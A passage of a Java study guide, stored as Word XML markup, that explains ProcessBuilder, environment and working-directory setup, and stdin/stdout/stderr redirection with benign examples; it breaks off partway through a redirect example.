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Java Process API — Complete Study Guide</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>**Module 13 | Brutally Detailed Reference**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Covers ProcessBuilder, Process, ProcessHandle (Java 9+), pipeline construction, I/O redirection, and security hardening against command injection. Every section includes full working examples.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>1. [Overview — The Java Process API](#1-overview--the-java-process-api)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. [ProcessBuilder — Creating and Configuring OS Processes](#2-processbuilder--creating-and-configuring-os-processes)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. [Setting Command, Arguments, Working Directory, Environment Variables](#3-setting-command-arguments-working-directory-environment-variables)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. [Redirecting stdin, stdout, stderr](#4-redirecting-stdin-stdout-stderr)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. [Reading Process Output — getInputStream() / getErrorStream()](#5-reading-process-output--getinputstream--geterrorstream)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. [process.waitFor() and process.waitFor(timeout, unit)](#6-processwaitfor-and-processwaitfortimeout-unit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>7. [process.destroyForcibly() — Killing Processes](#7-processdestroyforcibly--killing-processes)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>8. [ProcessHandle (Java 9+)](#8-processhandle-java-9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>9. [Piping Processes — ProcessBuilder.startPipeline()](#9-piping-processes--processbuilderstartpipeline)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>10. [Security — Command Injection Risk](#10-security--command-injection-risk)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>11. [Additional Topics](#11-additional-topics)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>12. [Quick Reference Cheat Sheet](#12-quick-reference-cheat-sheet)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Overview — The Java Process API</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Java's Process API allows you to **spawn, communicate with, monitor, and terminate** operating system processes from within a Java program. The API spans two generations:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Class / Interface | Since | Purpose |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Runtime.exec()` | Java 1.0 | Legacy, low-level, error-prone |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `ProcessBuilder` | Java 5 | Modern process creation and configuration |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Process` | Java 1.0 (improved Java 9) | Handle to a running OS process |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `ProcessHandle` | Java 9 | Inspect and manage any OS process by PID |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `ProcessHandle.Info` | Java 9 | Metadata about a running process |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>The Process Lifecycle</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder.start()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>▼</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>┌─────────────┐     getInputStream()   ┌───────────────┐</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│             │ ──────────────────────► │  Java reads   │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│  OS Process │     getOutputStream()  │  process      │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│  (child)    │ ◄────────────────────── │  output       │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│             │     getErrorStream()   └───────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>└──────┬──────┘</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>▼</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>waitFor() / exitValue()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>│</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>▼</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>destroy() / destroyForcibly()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Core Principle — Always Read Output</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>A critically important rule: if your process writes to stdout or stderr and you **don't read it**, the process will **block** when the OS pipe buffer fills up (typically 4–64 KB). Both the child process and the parent Java program will deadlock. This is one of the most common bugs when using the Process API.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. ProcessBuilder — Creating and Configuring OS Processes</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessBuilder` is a mutable configuration object. You set it up, then call `start()` to launch the process.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Basic Construction</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Constructor takes varargs: command + arguments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("ls", "-la", "/tmp");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Or a List&lt;String&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>List&lt;String&gt; cmd = Arrays.asList("git", "log", "--oneline", "-10");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb2 = new ProcessBuilder(cmd);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 `start()` — Launch the Process</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Calling `start()` is what actually creates the OS process. It returns a `Process` object.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("echo", "Hello from OS");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process process = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// read output, wait, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// thrown if the executable is not found or not executable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>e.printStackTrace();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 `command()` — Get or Set the Command</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("echo", "hello");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.command()); // [echo, hello]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>pb.command("ping", "-c", "3", "google.com");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.command()); // [ping, -c, 3, google.com]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Replace entire command list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.command(List.of("java", "-version"));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Full Minimal Example</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>import java.io.*;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.util.*;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class BasicProcess {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("echo", "Hello, World!");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true); // merge stderr into stdout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process process = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read all output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(process.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int exitCode = process.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("Output:    " + output.trim()); // Hello, World!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit code: " + exitCode);       // 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Setting Command, Arguments, Working Directory, Environment Variables</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Command and Arguments — Critical Rule: No Shell</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessBuilder` does **not** invoke a shell by default. Each argument must be a separate element in the list. Shell features like pipes (`|`), redirections (`&gt;`), glob expansion (`*`), variable substitution (`$VAR`) do **not** work unless you explicitly invoke a shell.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// WRONG — passes entire string as one argument to 'ls'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("ls -la /tmp"); // looks for executable literally named "ls -la /tmp"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// CORRECT — separate arguments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("ls", "-la", "/tmp");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// If you NEED shell features (use with caution — see Section 10):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Linux/macOS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("/bin/sh", "-c", "ls -la /tmp | grep java");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Windows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("cmd.exe", "/c", "dir /b C:\\Windows");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Working Directory — `directory()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Sets the working directory for the child process. Defaults to the JVM's current working directory.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("mvn", "clean", "install");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(new File("/home/user/my-project"));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Verify it was set</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.directory()); // /home/user/my-project</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Reset to JVM's working directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(null); // null means use JVM's cwd</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Practical: run git commands in a specific repo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder git = new ProcessBuilder("git", "status");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>git.directory(new File("/path/to/repo"));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = git.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Environment Variables — `environment()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Returns a **live mutable `Map&lt;String, String&gt;`** of the environment that will be passed to the child process. Initially it is a copy of the current JVM's environment.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("printenv");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Map&lt;String, String&gt; env = pb.environment();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Inspect current environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("JAVA_HOME: " + env.get("JAVA_HOME"));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("PATH:      " + env.get("PATH"));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Add a new variable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("MY_VAR", "hello_world");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("APP_ENV", "production");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Modify existing variable — append to PATH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String path = env.get("PATH");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("PATH", path + File.pathSeparator + "/opt/mytools/bin");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Remove a variable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.remove("UNWANTED_VAR");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Start with CLEAN environment (only what you set)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.clear();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("PATH", "/usr/bin:/bin");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("HOME", "/tmp/sandbox");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process process = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Full Configuration Example</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class FullConfig {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"java",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"-Xmx256m",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"-jar",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"my-app.jar",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"--port=8080"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Set working directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(new File("/opt/apps/my-app"));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Configure environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Map&lt;String, String&gt; env = pb.environment();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("APP_ENV", "production");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("DB_URL", "jdbc:postgresql://localhost/mydb");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>env.put("LOG_LEVEL", "INFO");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Merge stderr with stdout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Start it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process process = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Stream output in a background thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread reader = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader br = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(process.getInputStream()))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>br.lines().forEach(System.out::println);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>e.printStackTrace();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>reader.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>int exit = process.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>reader.join();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process exited with code: " + exit);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Redirecting stdin, stdout, stderr</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessBuilder` can redirect the standard streams of the child process to/from files or merge them together, **before** the process starts.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 `ProcessBuilder.Redirect` — The Redirect Type</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessBuilder.Redirect` is a sealed abstract class with factory methods and constants:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Redirect | Meaning |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.PIPE` (default) | Connect stream to Java via `getInputStream()`/`getOutputStream()` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.INHERIT` | Child inherits the JVM's own stdin/stdout/stderr (shares the console) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.DISCARD` | Output is discarded (sent to `/dev/null`) — Java 9+ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.from(file)` | Read stdin from a file |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.to(file)` | Write stdout/stderr to a file (overwrite) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `Redirect.appendTo(file)` | Append stdout/stderr to a file |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 `redirectOutput(Redirect)` — Redirect stdout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>File outFile = new File("output.txt");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Write stdout to a file (overwrite)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("ls", "-la");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.to(outFile));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Append stdout to a file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.appendTo(outFile));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Inherit JVM's stdout (process output appears in console directly)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.INHERIT);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Discard stdout (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.DISCARD);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Convenience shortcut — same as Redirect.to(file):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(outFile); // overload that accepts File directly</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 `redirectInput(Redirect)` — Redirect stdin</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>File inputFile = new File("input.txt");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read stdin from a file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("sort");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectInput(Redirect.from(inputFile));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// shortcut:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectInput(inputFile);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Inherit JVM's stdin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectInput(Redirect.INHERIT);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 `redirectError(Redirect)` — Redirect stderr</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>File errFile = new File("errors.log");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.to(errFile));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.appendTo(errFile));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.INHERIT);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.DISCARD); // Java 9+ — silently discard errors</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 `redirectErrorStream(boolean)` — Merge stderr into stdout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The most commonly used redirect. When `true`, stderr is merged into stdout so you only have one stream to read.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("javac", "MyClass.java");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true); // compiler errors come through getInputStream()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(p.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Contains both normal output AND error messages</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`redirectErrorStream(true)` is **mutually exclusive** with `redirectError()` — setting one overrides the other.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Checking Current Redirects — `redirectInput()`, `redirectOutput()`, `redirectError()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Called with no arguments, these return the current `Redirect` configuration:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("ls");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.redirectInput());  // PIPE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.redirectOutput()); // PIPE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(pb.redirectError());  // PIPE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.7 Full Redirect Example — Separate stdout and stderr to files</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class SeparateRedirects {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>File stdout = new File("stdout.log");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
